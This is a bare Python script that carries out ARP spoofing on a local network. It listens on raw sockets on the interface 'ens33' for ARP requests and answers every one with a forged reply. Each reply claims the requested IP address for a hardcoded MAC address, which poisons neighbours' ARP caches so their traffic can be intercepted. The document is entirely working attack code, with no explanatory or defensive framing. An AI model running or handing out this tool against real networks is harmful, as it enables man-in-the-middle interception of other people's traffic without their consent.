import socket
import struct 
import queue 
import threading 

mysocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0806))  
mysocket_s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))

mysocket_s.bind(("ens33",socket.htons(0x0806)))

Q = queue.Queue()

def arp_receiver():
	while True :
		pkt = mysocket.recvfrom(1024)
		ethhead = pkt[0][0:14]
		eth = struct.unpack("!6s6s2s",ethhead)
		arp_h = pkt[0][14:42]
		arp_l = struct.unpack("!2s2sss2s6s4s6s4s",arp_h)
		if arp_l[4] ==b"\x00\x01":
			Q.put([eth,arp_l])

def arp_sender():
	while True:
		main_list = Q.get()
		eth_header = main_list[0]
		arp_packet = main_list[1]
		sor = b"\x00\x50\x56\x29\x6c\x85"
		code = b'\x08\x06'
		htype = b'\x00\x01'
		protype = b'\x08\x00'
		hsize = b'\x06'
		psize = b'\x04'
		opcode = b'\x00\x02'
		eth1 = eth_header[1]+sor+eth_header[-1]
		arp_p = eth1+htype+protype+hsize+psize+opcode+sor+arp_packet[-1]+arp_packet[5]+arp_packet[6]
		mysocket_s.send(arp_p)
		print ("Done123")

r =  threading.Thread(target=arp_receiver)
s = threading.Thread(target=arp_sender)

r.start()
s.start()



